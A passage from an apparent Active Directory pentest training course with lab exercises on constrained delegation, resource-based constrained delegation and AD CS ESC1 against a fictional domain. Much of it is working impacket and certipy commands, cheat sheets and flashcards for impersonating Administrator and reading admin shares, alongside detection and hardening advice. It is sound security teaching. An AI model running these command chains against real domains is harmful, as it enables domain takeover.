The query is "any account with msDS-AllowedToDelegateTo containing a service on a Domain Controller, especially cifs/, host/, ldap/, rpcss/, or time/." LDAP filter:

(&(msDS-AllowedToDelegateTo=cifs/corp-dc01*)
  (msDS-AllowedToDelegateTo=cifs/corp-dc02*))

Or any wildcard match against DC hostnames. Each result is a Tier-0 escalation path. The mitigation is to remove the entry; if the delegation is needed (rare for DCs), restrict T2A4D to break the protocol-transition convenience and force the attacker to capture an actual forwardable TGT. For a comprehensive view, BloodHound's AllowedToDelegate edges show the same data graphically.

docs.title: Key Takeaways
docs.text:
• Constrained delegation + T2A4D = unilateral impersonation of any user to the allowed service.
  • getST.py -impersonate <user> -spn <target> performs S4U2self then S4U2proxy.
  • A delegation entry pointing at any DC service is a Tier-0 escalation path.
  • The KDC enforces the SPN list; only Domain Admins / Account Operators can edit it.
  • BloodHound AllowedToDelegate edges show the graph of every delegation in the domain.

docs.title: Cheat Sheet Recap
docs.text:
The four operations below cover discovery and exploitation. Run them in this order on every constrained delegation finding.

Goal Command Find constrained-PT accounts ldapsearch -x -LLL -H ldap://<dc> -D "<DOMAIN>\<u>" -w '<pw>' -b "<DN>" "(&(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216))" sAMAccountName msDS-AllowedToDelegateTo Run S4U2self + S4U2proxy getST.py "<domain>/<svc>:<pw>" -spn '<service>/<host>.<domain>' -impersonate Administrator -dc-ip <dc> Use the ticket export KRB5CCNAME=Administrator.ccache && smbclient //<host>/<share> -k -c "ls" Verify impersonation klist (target principal should be Administrator@<REALM>)

docs.title: Spaced Repetition
docs.text:
Card 1: getST.py Invocation

Q: Write the getST.py command to obtain a TGS impersonating Administrator for cifs/dc01.corp.local using source svc_app:Pass# against corp.local.

Answer 
getST.py "corp.local/svc_app:Pass#" \
  -spn 'cifs/dc01.corp.local' \
  -impersonate Administrator \
  -dc-ip 10.10.10.10

Output: Administrator.ccache. Use with KRB5CCNAME=Administrator.ccache and any -k Kerberos-aware tool.

Card 2: T2A4D Flag Bit

Q: What is the userAccountControl bit value for TRUSTED_TO_AUTH_FOR_DELEGATION, and why does it matter?

Answer

0x1000000 = decimal 16777216. Setting it on an account enables S4U2self, which lets the account obtain a service ticket for any user without that user presenting a TGT. Combined with msDS-AllowedToDelegateTo, it allows unilateral impersonation. Find such accounts via (userAccountControl:1.2.840.113556.1.4.803:=16777216). T2A4D = "Trust this user for delegation to specified services only, and use any authentication protocol" (the protocol transition piece).

Card 3: Three Delegation Types

Q: Distinguish unconstrained, constrained-without-protocol-transition, and constrained-with-protocol-transition delegation.

Answer

Unconstrained: TRUSTED_FOR_DELEGATION UAC bit; account receives forwardable TGTs for any user authenticating to it; can act anywhere as any of them. Constrained without PT: msDS-AllowedToDelegateTo populated; no T2A4D; needs an existing forwardable TGT to use S4U2proxy. Constrained with PT: msDS-AllowedToDelegateTo + T2A4D; uses S4U2self to bootstrap, then S4U2proxy; unilateral. The third is the classic abuse target.

Card 4: Why DC CIFS Is Worst-Case

Q: Why is delegation to cifs/dc01 essentially Domain Admin?

Answer

Reading \\dc01\C$ as Administrator gives access to the entire NTFS volume on the DC, including the registry hives (SYSTEM, SAM, SECURITY), ntds.dit (the AD database), and any LSA secrets. From there secretsdump extracts the krbtgt hash, all user hashes, and machine secrets; effectively the entire domain is compromised. Any delegation entry pointing at any DC service should be removed unless the operational need is overwhelming and the source account is itself Tier-0.

Card 5: SeEnableDelegationPrivilege

Q: Which privilege is required to write msDS-AllowedToDelegateTo, and why does GenericWrite alone not suffice?

Answer

SeEnableDelegationPrivilege, granted only to Domain Admins and (by default) Account Operators. The schema-level enforcement uses this privilege rather than the standard ACL: even an account with GenericWrite on a target user cannot add to msDS-AllowedToDelegateTo without also having SeEnableDelegationPrivilege on the DC. The privilege gate is intentional protection against delegation abuse via mid-tier privilege escalations. Defenders should ensure Account Operators membership is empty (most environments do not need it).

docs.title: Before You Begin
docs.text:
Resource-Based Constrained Delegation (RBCD) is the post-2012 evolution of constrained delegation. Instead of the source account declaring which services it can delegate to (the classic msDS-AllowedToDelegateTo), the target resource declares which sources are allowed to delegate to it via the msDS-AllowedToActOnBehalfOfOtherIdentity attribute. The trust direction reverses; the privilege required to configure changes from the rare SeEnableDelegationPrivilege to the much more common WriteProperty on the target's RBCD attribute.

The default ms-DS-MachineAccountQuota of 10 means any authenticated user can create up to 10 computer accounts. An attacker who can write the RBCD attribute on a target computer can: create their own computer account, write that account's SID into the target's RBCD list, then S4U2self+S4U2proxy from their controlled account to impersonate any user (including Administrator) to the target.

Exercise 4.5 has IT_HelpDesk granted WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity of WS-FIN-<TOKEN>. j.chen is a member. Take over.

Tools required: impacket-addcomputer, impacket-rbcd, impacket-getST, smbclient, ldapsearch. Pre-installed on Kali.

docs.title: Scenario
docs.text:
Marcus Bell: "RBCD is constrained delegation in reverse. Instead of asking the source account 'who can you delegate for?' you ask the target computer 'who do you trust to delegate to you?' If you can write to that attribute, you trust yourself."

The flag is \\WS-FIN-<TOKEN>\C$\rbcd_flag_<token>.txt, readable as Administrator.

Credentials:

Username Password j.chen Welcome2026#

Domain: corp.nordport.local

docs.title: Your Objectives
docs.text:
• Verify ms-DS-MachineAccountQuota >= 1
  • Create attacker-controlled computer account fakectrl_<token>$
  • Write its SID into msDS-AllowedToActOnBehalfOfOtherIdentity on WS-FIN-<TOKEN>
  • Use S4U2self+S4U2proxy from fakectrl_<token>$ to obtain a TGS for cifs/WS-FIN-<TOKEN> as Administrator
  • Read \\WS-FIN-<TOKEN>\C$\rbcd_flag_<token>.txt

docs.title: The RBCD Chain in Four Boxes
docs.text:
Each step writes a small change in AD; the cumulative effect is local-admin on the target. The diagram below is the chain you will execute.

flowchart LR
    JC["j.chen<br/>(starting foothold)"]
    NC["fakectrl_<token>$<br/>(MAQ=10 lets you create)"]
    WS["WS-FIN-<TOKEN><br/>(target computer)"]
    ADM["Administrator-as-source<br/>(forged TGS)"]
    FLAG["C$ read as Administrator<br/>(rbcd_flag_<token>.txt)"]

    JC -->|addcomputer.py| NC
    NC -->|rbcd.py write SID into target| WS
    WS -->|getST.py S4U2self+S4U2proxy| ADM
    ADM -->|smbclient -k //target/C$| FLAG

docs.title: Classic vs RBCD Trust Direction
docs.text:
The trust arrow flips between the two delegation styles. The diagram below shows the difference at a glance.

flowchart LR
    subgraph Classic["Classic constrained delegation"]
        S1["Source: svc_deleg<br/>msDS-AllowedToDelegateTo = cifs/dc01"]
        T1["Target: dc01"]
        S1 -- "source declares the trust" --> T1
    end
    subgraph RBCD["Resource-Based Constrained Delegation"]
        S2["Source: fakectrl<br/>(any account you control)"]
        T2["Target: ws01<br/>msDS-AllowedToActOnBehalfOfOtherIdentity = fakectrl"]
        T2 -- "target declares the trust" --> S2
    end

docs.title: Background: Why RBCD Is Easier to Abuse Than Classic Constrained Delegation
docs.text:
Property Classic constrained delegation RBCD Attribute that lists allowed services / sources msDS-AllowedToDelegateTo (on source) msDS-AllowedToActOnBehalfOfOtherIdentity (on target) Privilege required to configure SeEnableDelegationPrivilege (Domain Admins / Account Operators) Any ACL right that includes WriteProperty on the target's attribute Common ACL paths Rare; tightly held Common; helpdesk groups often have GenericWrite or WriteProperty on workstations Detection signal Schema-protected attribute changes; rare Standard ACL writes; lost in noise Mitigation difficulty Medium (the attribute is rarely needed) Hard (RBCD is widely used for legitimate Windows servicing)

The shift from source-side to target-side configuration is what makes RBCD a frequent finding. Helpdesk teams routinely have GenericWrite on workstation OUs (so they can rename machines, push GPOs, etc.); GenericWrite includes WriteProperty on every attribute, including the RBCD one.

docs.title: ms-DS-MachineAccountQuota: the unrelated default that enables RBCD abuse
docs.text:
ms-DS-MachineAccountQuota defaults to 10. The quota means every authenticated user can create up to 10 computer accounts in the domain. The intent is to support self-service domain join (a user joins their workstation to the domain). The side effect is that any compromised account can create a controlled computer account whose password it knows.

The defender control is to set ms-DS-MachineAccountQuota = 0 and grant computer-creation rights only to a specific provisioning account. Most environments leave the default in place because changing it breaks self-service domain join workflows.

docs.title: The full RBCD attack chain
docs.text:
1. addcomputer.py: create fakectrl_<token>$ with a known password
2. rbcd.py write: add fakectrl_<token>$'s SID to WS-FIN-<TOKEN>'s
   msDS-AllowedToActOnBehalfOfOtherIdentity
3. getST.py with the controlled account credentials, S4U flow:
     S4U2self -> get a TGS for fakectrl_<token>$-as-Administrator
     S4U2proxy -> get a TGS for cifs/WS-FIN-<TOKEN>-as-Administrator
4. Use the TGS to mount C$ on the target as Administrator

The chain is four commands. Each is well-documented in impacket. The combination is one of the most common AD privesc paths discovered in modern internal pentests.

docs.title: Verify MachineAccountQuota
docs.text:
ldapsearch -x -LLL -H ldap://corp-dc01 \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" -s base \
  "(objectClass=*)" ms-DS-MachineAccountQuota

Or with netexec:

netexec ldap corp-dc01 -u j.chen -p 'Welcome2026#' -d corp.nordport.local \
  -M maq

docs.title: Create a controlled computer account
docs.text:
addcomputer.py -computer-name 'fakectrl_<token>' \
  -computer-pass 'AttackerPwd2026#' \
  -dc-host corp-dc01 -domain-netbios CORP \
  corp.nordport.local/j.chen:'Welcome2026#'

The trailing $ in computer SAM accounts is added automatically by impacket. The account is enabled with the password you specify.

docs.title: Write RBCD attribute
docs.text:
rbcd.py -delegate-from "fakectrl_<token>$" \
  -delegate-to "WS-FIN-<TOKEN>$" \
  -dc-ip <dc> -action write \
  corp.nordport.local/j.chen:'Welcome2026#'

To remove later:

rbcd.py ... -action remove

docs.title: S4U2self + S4U2proxy as the controlled computer
docs.text:
getST.py -spn "cifs/WS-FIN-<TOKEN>.corp.nordport.local" \
  -impersonate Administrator \
  -dc-ip <dc> \
  "corp.nordport.local/fakectrl_<token>\$:AttackerPwd2026#"

Note the escaped \$ in the SAM (fakectrl_<token>$); shell escaping varies. The output ccache is named after the impersonated user.

docs.title: Use the ticket
docs.text:
export KRB5CCNAME=Administrator.ccache
smbclient //WS-FIN-<TOKEN>.corp.nordport.local/C$ -k -c "ls; get rbcd_flag_<token>.txt"

docs.title: Step 1: Verify MachineAccountQuota
docs.text:
ms-DS-MachineAccountQuota lives on the domain naming context root and applies to every authenticated user. The -s base scope plus an empty filter (objectClass=*) returns just the root object's attributes. Any non-zero value enables the rest of the chain.

Kali - Confirm MAQ >= 1

ldapsearch -x -LLL -H ldap://corp-dc01 \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" -s base \
  "(objectClass=*)" ms-DS-MachineAccountQuota
Token Effect -s base Search scope: just the base DN, no children. (objectClass=*) Match any object (the only object at base scope is the root). ms-DS-MachineAccountQuota Trailing attribute; only this attribute returned.

A value of 10 (the Microsoft default) means each user can create up to 10 computer accounts. Anything > 0 is sufficient for this exercise. A value of 0 means the chain breaks at Step 2; you would need to compromise an existing computer account instead.

docs.title: Step 2: Create the Controlled Computer Account
docs.text:
addcomputer.py calls SAMR's SamrCreateUser2InDomain to create a computer-class user object. The MAQ check happens server-side; if you have not exhausted your 10-account quota, the create succeeds. The new account's password is whatever you supply on the command line.

Kali - addcomputer.py

addcomputer.py -computer-name "fakectrl_${OCR_SCOPE_TOKEN}" \
  -computer-pass 'AttackerPwd2026#' \
  -dc-host corp-dc01 -domain-netbios CORP \
  "corp.nordport.local/j.chen:Welcome2026#"
Flag Effect -computer-name SAM name (without trailing $); impacket appends it. -computer-pass Initial password for the account. -dc-host DC hostname (used for SMB to the DC). -domain-netbios NetBIOS domain name (capitalized). <realm>/<user>:<pw> Authenticate as this domain user.

On success the message says the computer account was created. Verify by authenticating as it (the \$ escapes the $ from shell interpretation):

netexec smb corp-dc01 -u "fakectrl_${OCR_SCOPE_TOKEN}\$" \
  -p 'AttackerPwd2026#' -d corp.nordport.local

docs.title: Step 3: Write the RBCD Attribute
docs.text:
rbcd.py write modifies msDS-AllowedToActOnBehalfOfOtherIdentity on the target. The attribute is a binary security descriptor; impacket reads any existing value, appends the source's SID, and writes the new descriptor back. The DC checks j.chen's effective rights on the target's attribute; the WriteProperty grant from IT_HelpDesk membership permits the modification.

Kali - rbcd.py write

TOK=$(echo "${OCR_SCOPE_TOKEN}" | tr 'a-z' 'A-Z')
rbcd.py -delegate-from "fakectrl_${OCR_SCOPE_TOKEN}\$" \
        -delegate-to "WS-FIN-${TOK}\$" \
        -dc-ip <dc_ip> -action write \
        "corp.nordport.local/j.chen:Welcome2026#"
Flag Effect -delegate-from The source account that will be allowed to delegate. -delegate-to The target computer whose attribute is being modified. -action write Add the source SID; read queries; remove undoes. -dc-ip <ip> DC IP.

Successful output reports the new RBCD entry. To verify the write landed:

rbcd.py -delegate-to "WS-FIN-${TOK}\$" \
        -dc-ip <dc_ip> -action read \
        "corp.nordport.local/j.chen:Welcome2026#"

docs.title: Step 4: S4U2self + S4U2proxy
docs.text:
With fakectrl_<token>$ listed in the target's RBCD attribute, the same getST.py flow used in 4.4 now works against this target. The KDC validates the source SID against the target's attribute (rather than against the source's msDS-AllowedToDelegateTo); both validate paths converge on issuing a usable TGS.

Kali - getST.py from controlled account

cd ~/work && mkdir -p adpt-4-05 && cd adpt-4-05
TOK=$(echo "${OCR_SCOPE_TOKEN}" | tr 'a-z' 'A-Z')
getST.py -spn "cifs/WS-FIN-${TOK}.corp.nordport.local" \
         -impersonate Administrator \
         -dc-ip <dc_ip> \
         "corp.nordport.local/fakectrl_${OCR_SCOPE_TOKEN}\$:AttackerPwd2026#"
Flag Effect -spn <svc>/<host>.<realm> Target service. Must match how SMB derives the SPN. -impersonate <user> The user identity that will appear in the issued ticket. <realm>/<computer>$:<pw> Source authentication; computer accounts use the trailing $.

The output is Administrator.ccache.

docs.title: Step 5: Read the Flag
docs.text:
The ccache contains a TGS for cifs/WS-FIN-<token> issued to Administrator. SMB uses it transparently when KRB5CCNAME points at the file. The target's CIFS service authenticates the request as Administrator, who has full read on C$.

Kali - SMB to the target as Administrator

export KRB5CCNAME=Administrator.ccache
klist
smbclient "//WS-FIN-${TOK}.corp.nordport.local/C$" -k \
  -c "get rbcd_flag_${OCR_SCOPE_TOKEN}.txt"
cat rbcd_flag_${OCR_SCOPE_TOKEN}.txt

Submit the OCR{...} value.

docs.title: Step 6: Cleanup
docs.text:
Two artifacts were created: the RBCD entry on the target and the controlled computer account itself. Remove both. Order does not matter for cleanup; either can come first.

Kali - Remove RBCD entry and computer account

rbcd.py -delegate-from "fakectrl_${OCR_SCOPE_TOKEN}\$" \
        -delegate-to "WS-FIN-${TOK}\$" \
        -dc-ip <dc_ip> -action remove \
        "corp.nordport.local/j.chen:Welcome2026#"

bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  remove object "fakectrl_${OCR_SCOPE_TOKEN}\$"

The computer account belongs to j.chen (its mS-DS-CreatorSID is j.chen's SID), so j.chen has implicit delete rights regardless of any DACL.

Common gotchas

  • MAQ exhausted: re-running addcomputer.py with the same name on a different attempt counts toward the quota even if the prior account was deleted (the count is creation-side, not present-state). Use a different -computer-name if you exhaust 10.
  • Wrong target case: WS-FIN-J001$ and ws-fin-j001$ resolve to the same object in LDAP, but getST.py -spn and smbclient //... are case-sensitive on the host portion. Stick with uppercase consistently.
  • Shell $ expansion: bash treats $WORD as a variable. Always escape the trailing $ in computer SAMs as \$ or quote the whole string with single quotes.
  • LDAP signing required: if the domain enforces LDAP signing, the rbcd.py SASL bind must be properly negotiated. Add -k to use Kerberos instead of NTLM if the simple bind fails.
  • Cleanup forgotten: leaving fakectrl_$ behind exhausts your MAQ over time. Always remove it.

docs.title: Blue Team Perspective
docs.text:
Three distinct events fire across the chain. None alone is high-signal; the combination from one source IP across two minutes is.

Activity Event ID Where it fires Computer account created (MAQ=10) 4741 DC Security log RBCD attribute written 5136 (msDS-AllowedToActOnBehalfOfOtherIdentity) DC Security log S4U2proxy issued 4769 with cname-in-pa-data ticket option DC Security log Auth as Administrator on target 4624 logon type 3 Target host log

How RBCD differs from classic CD detection

Classic constrained delegation has a tight detection on SeEnableDelegationPrivilege use; RBCD has no such privilege gate, so detection has to live in the attribute write itself. SIEM rule that catches RBCD reliably: alert on event 5136 where Object Class = computer and Attribute LDAP Display Name = msDS-AllowedToActOnBehalfOfOtherIdentity from any non-Tier-0 principal. Volume is low; signal is high.

docs.title: Hardening Note
docs.text:
RBCD is a legitimate Windows servicing primitive; you cannot ban it. You harden the conditions that make it abusable.

Practical RBCD hardening

  • Set ms-DS-MachineAccountQuota = 0 and grant computer creation only to a dedicated provisioning account.
  • Audit msDS-AllowedToActOnBehalfOfOtherIdentity weekly across all computer objects; baseline the legitimate entries.
  • Tighten ACLs on workstation OUs: helpdesk groups should have specific extended rights, not GenericWrite.
  • Mark Tier-0 accounts with Account is sensitive and cannot be delegated (NOT_DELEGATED UAC bit).
  • Enforce LDAP signing and channel binding to break NTLM-relay-to-LDAP RBCD chains.
  • Build SIEM detection on event 5136 for the RBCD attribute.

docs.title: Record Your Findings
docs.text:
Target computer:

WS-FIN-<TOKEN>

Created controlled account:

fakectrl_<token>$  (password: AttackerPwd2026#)

RBCD entry written:

fakectrl_<token>$ -> WS-FIN-<TOKEN>

Flag:

(OCR{rbcd_...})

docs.title: Analysis Questions
docs.text:
1. The classic constrained delegation attribute requires SeEnableDelegationPrivilege to write. Why doesn't RBCD's msDS-AllowedToActOnBehalfOfOtherIdentity have a similar protection?

Reveal Answer

RBCD was designed to support modern Windows Server features (cluster failover, IIS app-pool delegation, AD FS) where the target resource needs to declare its own delegation trust without needing a Tier-0 administrator to make the change every time. The attribute is therefore writeable via standard ACLs (WriteProperty), which is convenient for legitimate distributed Windows applications but easy to abuse: any helpdesk group with GenericWrite over a workstation OU now effectively has the right to take over every workstation in that OU. Microsoft considered the trade-off acceptable because the modern Windows servicing model assumes the target resource's administrator (which for workstations is typically the local IT team) should be allowed to declare delegation trust. The defender mitigation is to ensure no group with broad workstation-OU rights includes accounts that should not be effective local admin everywhere.

2. The default ms-DS-MachineAccountQuota = 10 is the enabling condition. What breaks if a defender sets it to 0?

Reveal Answer

Self-service domain join breaks. A user who runs the "Add this computer to the domain" wizard on a freshly imaged workstation needs the right to create a computer account; the default quota of 10 supports that without administrative intervention. Setting MAQ to 0 forces every domain join to be performed by an administrator (or a delegated account explicitly granted the Create Computer Objects extended right on the target OU). Many enterprises with mature provisioning automation set MAQ to 0 because their MDT / Intune / SCCM workflows handle domain join via a dedicated service account; the convenience of self-service is not needed. Smaller organizations leave the default and accept the RBCD risk. The defender's compromise: set MAQ to 0 and grant Create Computer Objects to a specific provisioning service account that lives in a tightly-controlled OU.

3. The attack works because we control the source account's password (we just created it). What if MAQ is 0 and we cannot create a computer? Are there other paths to RBCD exploitation?

Reveal Answer

Yes. Three alternative source-account acquisitions: (a) compromise an existing computer account by other means; machine accounts have the same delegation capabilities as user accounts, and pulling a machine secret via secretsdump.py -system or via mimikatz lsadump::secrets from a compromised host yields a usable source. (b) Compromise a service account (Kerberoast, ASREPRoast, GenericAll-then-reset). (c) Use coerced authentication from a target machine to the attacker's listener; the captured Net-NTLM hash can be relayed to LDAP to write the RBCD attribute as the coerced computer's identity. The relayed-to-LDAP-then-RBCD-then-S4U flow is documented in CVE-2019-1040 era write-ups and remains effective when LDAP signing is not enforced. Setting MAQ to 0 closes the easiest path; the RBCD primitive itself remains exploitable through these alternatives until the defender hardens the underlying ACL paths.

docs.title: Key Takeaways
docs.text:
• RBCD reverses the trust direction: target declares trust; source impersonates.
  • The trigger is WriteProperty on the target's msDS-AllowedToActOnBehalfOfOtherIdentity, not the rare SeEnableDelegationPrivilege.
  • ms-DS-MachineAccountQuota = 10 lets any user create the source account they need.
  • Four-tool chain: addcomputer.py -> rbcd.py write -> getST.py -> smbclient -k.
  • Mitigation: MAQ=0 plus tightly-scoped helpdesk ACLs on workstation OUs; LDAP signing enforced.

docs.title: Cheat Sheet Recap
docs.text:
The four operations below cover the entire RBCD chain. Memorize the order; this attack still works in 2026 against most internal environments.

Step Command 1. Create controlled computer addcomputer.py -computer-name '<name>' -computer-pass '<pw>' -dc-host <dc> -domain-netbios <NETBIOS> <domain>/<atk>:'<pw>' 2. Write RBCD attribute rbcd.py -delegate-from "<name>\$" -delegate-to "<TARGET>\$" -dc-ip <dc> -action write <domain>/<atk>:'<pw>' 3. S4U2self + S4U2proxy getST.py -spn 'cifs/<target>.<domain>' -impersonate Administrator -dc-ip <dc> "<domain>/<name>\$:<pw>" 4. Use the ticket export KRB5CCNAME=Administrator.ccache; smbclient //<target>/C$ -k -c "ls"

docs.title: Spaced Repetition
docs.text:
Card 1: RBCD vs Classic Constrained Delegation

Q: Where is the trust list stored for classic constrained delegation vs RBCD?

Answer

Classic: msDS-AllowedToDelegateTo on the source account, listing target SPNs the source may delegate to. RBCD: msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer, listing source SIDs allowed to delegate to it. Classic is configured by Tier-0 (SeEnableDelegationPrivilege); RBCD is configured by anyone with WriteProperty on the target's attribute, which is a much more common ACL right.

Card 2: addcomputer.py Syntax

Q: Write the command to create computer account fake01 with password Pwd# against corp.local DC dc01 as j.smith / Pass#.

Answer 
addcomputer.py -computer-name 'fake01' \
  -computer-pass 'Pwd#' \
  -dc-host dc01 -domain-netbios CORP \
  corp.local/j.smith:'Pass#'

The $ suffix is added automatically. Default MAQ allows this for any user. Confirm with netexec smb dc01 -u 'fake01$' -p 'Pwd#'.

Card 3: rbcd.py write

Q: Write the rbcd.py command to add fake01$ to WS01$'s allowed list against corp.local DC dc01 as j.smith / Pass#.

Answer 
rbcd.py -delegate-from "fake01\$" -delegate-to "WS01\$" \
  -dc-ip dc01 -action write \
  corp.local/j.smith:'Pass#'

Replace write with read to query, remove to clean up. The \$ escapes shell expansion of the $.

Card 4: S4U from a Controlled Computer Account

Q: Write the getST.py command to obtain a TGS for cifs/ws01.corp.local impersonating Administrator using fake01$ / Pwd# as source.

Answer 
getST.py -spn 'cifs/ws01.corp.local' -impersonate Administrator \
  -dc-ip 10.10.10.10 \
  "corp.local/fake01\$:Pwd#"

Output: Administrator.ccache. Use with KRB5CCNAME=Administrator.ccache smbclient //ws01.corp.local/C$ -k.

Card 5: MAQ Mitigation

Q: One change to ms-DS-MachineAccountQuota that closes the easy RBCD source-account path; what breaks?

Answer

Set ms-DS-MachineAccountQuota = 0 on the domain object. Self-service domain join breaks; users can no longer add their own workstation. The mitigation is to grant a dedicated provisioning account Create Computer Objects extended right on a specific OU and use that account for all domain joins via SCCM / MDT / Intune. Mature environments do this routinely; smaller environments accept the RBCD risk to keep self-service join working.

docs.title: Before You Begin
docs.text:
In June 2021 SpecterOps published "Certified Pre-Owned" and a series of follow-on papers cataloging Active Directory Certificate Services misconfigurations. They labeled the most common ones ESC1 through ESC15. ESC1 is the canonical "you can request a certificate as anyone" finding: a certificate template configured to (a) allow low-privileged users to enroll, (b) include client-authentication EKU, (c) require no manager approval, (d) let the requestor specify the Subject Alternative Name (SAN). The combination means a domain user can request a cert with SAN=Administrator, then authenticate to AD via PKINIT as Administrator.

Exercise 4.6 targets the per-token template WebSrv_<token> on Nordport's Enterprise CA. Find it, request a cert as Administrator, use it to authenticate, read the per-token flag.

Tools required: certipy. Pre-installed on Kali.

docs.title: Scenario
docs.text:
Marcus Bell: "AD CS templates control who can request what kind of certificate. A template that lets a regular user request a certificate for ANY identity (via Subject Alternative Name) is a Domain Admin button. Find the per-token vulnerable template, request a cert as Administrator, authenticate, profit."

The flag is \\corp-dc01\C$\esc1_flag_<token>.txt, readable as Administrator.

Credentials:

Username Password j.chen Welcome2026#

Domain: corp.nordport.local CA host: corp-ca01

docs.title: Your Objectives
docs.text:
• Use certipy find to enumerate vulnerable templates
  • Confirm WebSrv_<token> shows ESC1
  • Request a certificate with SAN = Administrator
  • Authenticate via PKINIT with certipy
  • Use the recovered Administrator NTLM hash (or TGT) to read the per-token flag

docs.title: ESC1 Attack Sequence
docs.text:
The diagram below traces the message flow. Note where SAN supply enters: in step 1, the attacker chooses the identity the cert will speak for.

sequenceDiagram
    autonumber
    participant A as Attacker (j.chen)
    participant CA as Issuing CA (corp-ca01)
    participant K as KDC (corp-dc01)
    participant T as Target service (cifs/dc01)

    A->>CA: certipy req -template WebSrv_<token><br/>-upn administrator@<domain>
    CA-->>A: PFX (cert + private key)<br/>Subject Alternative Name = Administrator
    A->>K: AS-REQ via PKINIT (PA-PK-AS-REQ)<br/>signed with PFX private key
    K-->>A: AS-REP with TGT for Administrator<br/>(+ NTLM hash on un-hardened DCs)
    A->>K: TGS-REQ for cifs/dc01 (with TGT)
    K-->>A: TGS-REP for Administrator
    A->>T: SMB connect with TGS as Administrator
    T-->>A: read C$/esc1_flag_<token>.txt

docs.title: What Defines ESC1 (and What to Look For Next)
docs.text:
ESC1 is one of fifteen ADCS misconfigurations catalogued by SpecterOps. The table below names the few you will actually meet on most engagements.

Finding Triggering condition Impact ESC1 Template lets enrollee supply SAN, low-priv enroll, client-auth EKU, no manager approval Cert as any user ESC2 Template has Any-Purpose or No EKU Cert usable for anything ESC3 Enrollment Agent template combined with weak signing requirement Sign on behalf of others ESC4 Template object has weak DACL allowing edit Modify template into ESC1 ESC6 CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 set Every template behaves as SAN-supply ESC8 CA Web Enrollment endpoint accepts NTLM, no EPA Coerce + relay (covered in 4.7)

docs.title: Background: AD CS Templates and the SAN-Supply Trap
docs.text:
A certificate template defines who can request what kind of certificate. The relevant fields:

Field Effect Enrollment permissions Which principals can request the cert (often Authenticated Users or Domain Users for self-service templates) Manager Approval If on, requests pend until an admin approves Authorized Signatures (RA) If > 0, requires N pre-existing certificate signatures to enroll EKU (Extended Key Usage) What the cert is good for: Client Authentication, Smart Card Logon, Server Authentication, etc. Subject construction Either Built from this AD information (the requestor's identity) or Supply in the request (the requestor names the subject) Subject Alternative Name (SAN) Either Built from AD or Enrollee supplies subject (with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)

ESC1 is the combination: - Anyone can enroll (or any low-privileged group) - Client Authentication EKU - No manager approval - No RA signature required - Enrollee supplies subject (or SAN)

When the enrollee supplies the SAN, the cert can be issued for any UPN the requestor names. PKINIT (RFC 4556) is the Kerberos extension that lets a client authenticate using a public key bound to a UPN. So a cert with SAN=Administrator@corp.local plus PKINIT = Administrator's TGT.

docs.title: The CA flag that closes the loophole
docs.text:
Microsoft published EDITF_ATTRIBUTESUBJECTALTNAME2 as a CA-level configuration. When set, the CA accepts SAN values from the request even on templates that should not allow it. Setting EDITF_ATTRIBUTESUBJECTALTNAME2 turns every template into ESC6 (a separate finding). Defenders should ensure it is NOT set:

certutil -getreg policy\EditFlags

If EDITF_ATTRIBUTESUBJECTALTNAME2 appears in the result, the CA is globally vulnerable to ESC6 regardless of template settings.

docs.title: Why PKINIT yields the NTLM hash too
docs.text: PKINIT authentication issues a TGT, but certipy auth also extracts the NTLM hash of the authenticated user from the PAC's PAC_CREDENTIAL_INFO field, which the KDC populates when it issues the TGT in response to PKINIT. So a successful certipy auth as Administrator gives you both a usable TGT (immediately) and the NTLM hash (for pass-the-hash to non-Kerberos services). The NTLM hash extraction was disabled in Microsoft's May 2022 PKINIT hardening (PerformTicketSignature = 1); on hardened DCs you only get the TGT.

docs.title: certipy find (template enumeration)
docs.text:
certipy find -u j.chen@corp.nordport.local -p 'Welcome2026#' \
  -dc-ip <dc_ip> -vulnerable -enabled

Output reports every vulnerable template with its ESC classification: [!] Certificate template "WebSrv_<token>" is vulnerable to ESC1.

docs.title: certipy req (request a cert)
docs.text:
certipy req -u j.chen@corp.nordport.local -p 'Welcome2026#' \
  -ca Nordport-Issuing-CA -template WebSrv_<token> \
  -upn administrator@corp.nordport.local \
  -dc-ip <dc_ip>
Flag Effect -ca CA name (from certipy find output) -template template name -upn the SAN value (the identity you are claiming) - Output: administrator.pfx (the cert + private key)

docs.title: certipy auth (PKINIT)
docs.text:
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>

Output: a Kerberos TGT cached at administrator.ccache plus, on un-hardened DCs, the NTLM hash printed to stdout.

docs.title: Step 1: Enumerate Vulnerable Templates
docs.text:
certipy find walks every certificate template, evaluates each against the ESC1 through ESC15 checklists, and prints which findings apply. The -vulnerable -enabled filter restricts output to enabled templates that are actually exploitable; without these flags certipy lists every template (useful for inventory, noisy for attack).

Kali - certipy find vulnerable

certipy find -u j.chen@corp.nordport.local -p 'Welcome2026#' \
  -dc-ip <dc_ip> -vulnerable -enabled \
  -text -output adcs_find
less adcs_find_Certipy.txt
Flag Effect -u <user>@<realm> Authentication; certipy uses Kerberos by default. -p '<pw>' Password. -dc-ip <ip> KDC IP. -vulnerable Restrict output to templates with at least one ESC finding. -enabled Only enabled templates (disabled templates cannot be used regardless). -text Render output as readable text (default is JSON). -output <stem> Write the report to <stem>_Certipy.txt.

Search for WebSrv_${OCR_SCOPE_TOKEN} in the output. Confirm it is flagged ESC1 with the four enabling conditions listed.

docs.title: Step 2: Request a Certificate as Administrator
docs.text:
certipy req is the equivalent of Windows' certreq.exe. With -upn, certipy populates the SAN field of the CSR with the chosen UPN. The CA accepts because the template's CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag is set; it issues a cert whose Subject Alternative Name says administrator@corp.nordport.local even though the requestor is j.chen.

Kali - Request the cert

cd ~/work && mkdir -p adpt-4-06 && cd adpt-4-06
certipy req -u j.chen@corp.nordport.local -p 'Welcome2026#' \
  -ca Nordport-Issuing-CA \
  -template "WebSrv_${OCR_SCOPE_TOKEN}" \
  -upn 'administrator@corp.nordport.local' \
  -dc-ip <dc_ip>
